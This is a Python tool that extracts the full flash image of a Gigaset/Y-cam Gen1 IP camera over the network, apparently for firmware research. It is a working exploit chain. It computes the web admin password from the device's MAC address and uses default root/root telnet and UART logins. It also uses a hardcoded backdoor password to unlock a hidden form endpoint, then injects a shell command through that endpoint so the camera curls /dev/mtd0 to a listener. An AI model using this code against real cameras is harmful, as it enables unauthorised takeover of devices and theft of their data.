#!/usr/bin/env python3
import argparse
import base64
import hashlib
import http.server
import os
import queue
import socket
import socketserver
import sys
import threading
import time
import http.client
import urllib.error
import urllib.parse
import urllib.request


SENSOR_PASSWORD = "SENsORORANtEK0825"
DEFAULT_FLASH_SIZE = 8 * 1024 * 1024
IAC = 255
DONT = 254
DO = 253
WONT = 252
WILL = 251


def derive_admin_password(mac):
    compact = "".join(ch for ch in mac.upper() if ch in "0123456789ABCDEF")
    if len(compact) != 12:
        raise ValueError("MAC must contain 12 hex digits")
    token = "LUCKOTVF" + compact[::-1] + "YCAMVF"
    return base64.b64encode(token.encode("ascii")).decode("ascii")


def choose_pc_ip(camera_ip):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.connect((camera_ip, 80))
        return sock.getsockname()[0]


class DumpHandler(http.server.BaseHTTPRequestHandler):
    output_path = None
    expected_size = None
    result_queue = None

    def log_message(self, fmt, *args):
        sys.stderr.write("[%s] %s\n" % (self.log_date_time_string(), fmt % args))

    def do_POST(self):
        self._receive()

    def do_PUT(self):
        self._receive()

    def _receive(self):
        total = 0
        sha = hashlib.sha256()
        error = None
        try:
            with open(self.output_path, "wb") as out:
                length = self.headers.get("Content-Length")
                if length is None:
                    while True:
                        chunk = self.rfile.read(64 * 1024)
                        if not chunk:
                            break
                        out.write(chunk)
                        sha.update(chunk)
                        total += len(chunk)
                else:
                    remaining = int(length)
                    while remaining:
                        chunk = self.rfile.read(min(64 * 1024, remaining))
                        if not chunk:
                            raise OSError("connection closed before full body was received")
                        out.write(chunk)
                        sha.update(chunk)
                        total += len(chunk)
                        remaining -= len(chunk)
            if self.expected_size is not None and total != self.expected_size:
                error = "received %d bytes, expected %d" % (total, self.expected_size)
        except Exception as exc:
            error = str(exc)

        if error:
            self.send_response(500)
            self.end_headers()
            self.result_queue.put({"ok": False, "error": error, "bytes": total})
            return

        digest = sha.hexdigest()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK\n")
        self.result_queue.put({"ok": True, "bytes": total, "sha256": digest})


def post_form(camera_ip, username, password, path, fields, timeout=10, ignore_disconnect=False):
    url = "http://%s%s" % (camera_ip, path)
    data = urllib.parse.urlencode(fields).encode("ascii")
    request = urllib.request.Request(url, data=data, method="POST")
    token = base64.b64encode(("%s:%s" % (username, password)).encode("utf-8")).decode("ascii")
    request.add_header("Authorization", "Basic " + token)
    request.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return response.status, response.read(512)
    except urllib.error.HTTPError as exc:
        body = exc.read(512)
        if exc.code in (301, 302, 303, 307):
            return exc.code, body
        raise RuntimeError("HTTP %d from %s: %r" % (exc.code, url, body))
    except http.client.RemoteDisconnected:
        if ignore_disconnect:
            return 0, b""
        raise


def start_receiver(bind_ip, port, output_path, expected_size, result_queue):
    handler = type("BoundDumpHandler", (DumpHandler,), {})
    handler.output_path = output_path
    handler.expected_size = expected_size
    handler.result_queue = result_queue

    class ReusableTCPServer(socketserver.TCPServer):
        allow_reuse_address = True

    server = ReusableTCPServer((bind_ip, port), handler)
    thread = threading.Thread(target=server.handle_request, daemon=True)
    thread.start()
    return server, thread


def validate_flash(path):
    with open(path, "rb") as fh:
        head = fh.read(8)
        fh.seek(0x20000)
        mef = fh.read(4)
    notes = []
    notes.append("flash_header=%r" % head)
    notes.append("mef_at_0x20000=%r" % mef)
    return notes


def telnet_read_available(sock, timeout=0.2):
    sock.settimeout(timeout)
    out = bytearray()
    while True:
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        i = 0
        while i < len(data):
            if data[i] == IAC and i + 2 < len(data):
                cmd = data[i + 1]
                opt = data[i + 2]
                if cmd in (DO, DONT):
                    sock.sendall(bytes([IAC, WONT, opt]))
                    i += 3
                    continue
                if cmd in (WILL, WONT):
                    sock.sendall(bytes([IAC, DONT, opt]))
                    i += 3
                    continue
            out.append(data[i])
            i += 1
    return bytes(out)


def telnet_wait_for(sock, needle, timeout=10):
    deadline = time.monotonic() + timeout
    buf = bytearray()
    while time.monotonic() < deadline:
        buf.extend(telnet_read_available(sock, 0.2))
        text = buf.decode("latin1", errors="replace")
        if needle in text:
            return text
    raise TimeoutError("timed out waiting for %r" % needle)


def text_wait_for_any(read_func, needles, timeout):
    deadline = time.monotonic() + timeout
    buf = bytearray()
    encoded = [needle.encode("latin1") for needle in needles]
    while time.monotonic() < deadline:
        data = read_func()
        if data:
            buf.extend(data)
            for needle in encoded:
                if needle in buf:
                    return buf.decode("latin1", errors="replace"), needle.decode("latin1")
        time.sleep(0.05)
    raise TimeoutError("timed out waiting for one of %r" % (needles,))


def telnet_run(host, port, username, password, command, timeout):
    with socket.create_connection((host, port), timeout=10) as sock:
        telnet_wait_for(sock, "login:", 10)
        sock.sendall((username + "\n").encode("ascii"))
        telnet_wait_for(sock, "Password:", 10)
        sock.sendall((password + "\n").encode("ascii"))
        time.sleep(0.6)
        telnet_read_available(sock, 0.5)
        sock.sendall((command + "\n").encode("ascii"))
        output = telnet_wait_for(sock, "# ", timeout)
        sock.sendall(b"exit\n")
        return output


def uart_run(port, baud, username, password, command, timeout, login_mode):
    try:
        import serial
    except ImportError as exc:
        raise RuntimeError("PySerial is required for --method uart; install pyserial") from exc

    with serial.Serial(port, baud, timeout=0.2) as ser:
        def read_func():
            return ser.read(4096)

        def write_line(line):
            ser.write(line.encode("latin1") + b"\r")

        write_line("")
        seen = ""
        if login_mode != "none":
            seen, matched = text_wait_for_any(read_func, ("login:", "Password:", "# "), 12)
            if matched == "login:":
                write_line(username)
                text_wait_for_any(read_func, ("Password:",), 10)
                write_line(password)
                text_wait_for_any(read_func, ("# ",), 15)
            elif matched == "Password:":
                write_line(password)
                text_wait_for_any(read_func, ("# ",), 15)
        else:
            seen, _ = text_wait_for_any(read_func, ("# ",), 12)

        write_line(command)
        output, _ = text_wait_for_any(read_func, ("# ",), timeout)
        return seen + output


def main():
    parser = argparse.ArgumentParser(description="Dump a Gigaset/Y-cam Gen1 camera W25Q64 flash over the local network.")
    parser.add_argument("--camera-ip", required=True)
    parser.add_argument("--mac", help="Camera MAC address; used to derive the web admin password.")
    parser.add_argument("--admin-password", help="Web admin password. If omitted, --mac is required.")
    parser.add_argument("--username", default="admin")
    parser.add_argument("--pc-ip", help="PC address reachable from the camera. Auto-detected when omitted.")
    parser.add_argument("--bind-ip", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8765)
    parser.add_argument("--output", default="gigaset_w25q64_dump.bin")
    parser.add_argument("--source", default="/dev/mtd0", help="Camera-side source to upload. Default: /dev/mtd0")
    parser.add_argument("--expected-size", type=int, default=DEFAULT_FLASH_SIZE)
    parser.add_argument("--timeout", type=int, default=240)
    parser.add_argument("--method", choices=("telnet", "uart", "web-sensor"), default="telnet")
    parser.add_argument("--telnet-user", default="root")
    parser.add_argument("--telnet-password", default="root")
    parser.add_argument("--telnet-port", type=int, default=23)
    parser.add_argument("--uart-port", help="Serial port for --method uart, for example COM5.")
    parser.add_argument("--uart-baud", type=int, default=115200)
    parser.add_argument("--uart-user", default="root")
    parser.add_argument("--uart-password", default="root")
    parser.add_argument("--uart-login-mode", choices=("auto", "none"), default="auto")
    args = parser.parse_args()

    password = args.admin_password
    if args.method == "web-sensor" and not password:
        if not args.mac:
            parser.error("provide either --admin-password or --mac")
        password = derive_admin_password(args.mac)

    pc_ip = args.pc_ip or choose_pc_ip(args.camera_ip)
    output_path = os.path.abspath(args.output)
    result_queue = queue.Queue(maxsize=1)

    print("camera=%s pc=http://%s:%d output=%s method=%s" % (args.camera_ip, pc_ip, args.port, output_path, args.method))
    print("starting local receiver")
    server, thread = start_receiver(args.bind_ip, args.port, output_path, args.expected_size, result_queue)
    try:
        if args.method == "telnet":
            command = "/usr/bin/curl --data-binary @%s http://%s:%d/d" % (args.source, pc_ip, args.port)
            print("requesting camera upload of %s over telnet" % args.source)
            telnet_run(
                args.camera_ip,
                args.telnet_port,
                args.telnet_user,
                args.telnet_password,
                command,
                args.timeout,
            )
        elif args.method == "uart":
            if not args.uart_port:
                parser.error("--uart-port is required with --method uart")
            command = "/usr/bin/curl --data-binary @%s http://%s:%d/d" % (args.source, pc_ip, args.port)
            print("requesting camera upload of %s over UART shell" % args.source)
            uart_run(
                args.uart_port,
                args.uart_baud,
                args.uart_user,
                args.uart_password,
                command,
                args.timeout,
                args.uart_login_mode,
            )
        else:
            print("unlocking sensor service handler")
            post_form(
                args.camera_ip,
                args.username,
                password,
                "/form/backdoorSensorSetRegApply",
                {"APPLY": "Apply", "MYPWD": SENSOR_PASSWORD},
            )
            command = "0;curl --data-binary @%s http://%s:%d/d;#" % (args.source, pc_ip, args.port)
            print("requesting camera upload of %s through web sensor handler" % args.source)
            post_form(
                args.camera_ip,
                args.username,
                password,
                "/form/backdoorSensorSetRegApply",
                {"SETTING": "Setting", "REGISTER": "0", "VALUE": command},
                timeout=5,
                ignore_disconnect=True,
            )

        deadline = time.monotonic() + args.timeout
        while time.monotonic() < deadline:
            try:
                result = result_queue.get(timeout=1)
                break
            except queue.Empty:
                continue
        else:
            raise TimeoutError("timeout waiting for camera upload")
    finally:
        server.server_close()
        thread.join(timeout=1)

    if not result["ok"]:
        raise RuntimeError(result["error"])

    print("received=%d sha256=%s" % (result["bytes"], result["sha256"]))
    for note in validate_flash(output_path):
        print(note)
    if args.expected_size == DEFAULT_FLASH_SIZE and result["bytes"] == DEFAULT_FLASH_SIZE:
        print("status=ok")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
